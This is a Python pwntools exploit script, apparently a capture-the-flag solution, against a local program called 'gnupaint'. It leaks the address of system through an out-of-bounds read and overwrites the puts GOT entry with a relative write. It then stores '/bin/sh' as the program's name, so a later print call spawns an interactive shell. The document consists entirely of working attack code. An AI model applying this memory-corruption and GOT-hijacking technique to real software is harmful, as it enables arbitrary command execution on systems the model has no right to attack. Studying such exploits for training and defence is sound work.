from pwn import *

payload = "/bin/sh"
puts_off = -26
sys_off = -23

p = process("./gnupaint")

if "gdb" in " ".join(sys.argv):
    gdb.attach(p, "\n".join(["set follow-fork-mode parent", "continue"]))
if "dbg" in " ".join(sys.argv):
    context.log_level = "debug"

def set_name(x):
    p.readuntil("Quit")
    p.send("4\n")

    p.readuntil("Rename Menu")
    p.send("{};\n".format(x))

def leak(x):
    p.readuntil("Quit")
    p.send("3\n")

    p.readuntil("Zoom Menu")
    p.send("{}\n0\n".format(x))
    p.readuntil("looks like:\n")
    return int(p.readuntil("\n").split("[")[1].split("m")[0])


def rel_write(value, img_rel):
    p.readuntil("Quit")
    p.send("2\n")

    # Clobber puts GOT to point to system_got
    p.readuntil("Pen Menu")
    p.send("{}\n0\n{}\n".format(img_rel, value))

def print_img():
    p.readuntil("Quit")
    p.send("1\n")

# Put our payload in the name
set_name(payload)

# Leak address for system
system_got = leak(sys_off)
print("Found system at {:x}".format(system_got))

# Replace puts in GOT to point to system
print("Write {:x} to image{}".format(system_got, puts_off))
rel_write(system_got, puts_off)

# Make our payload get passed puts() which actually calls system now
print_img()

# Interactive shell
p.send('echo "sh running as $(whoami)"\n')
print(p.readline())
p.interactive()

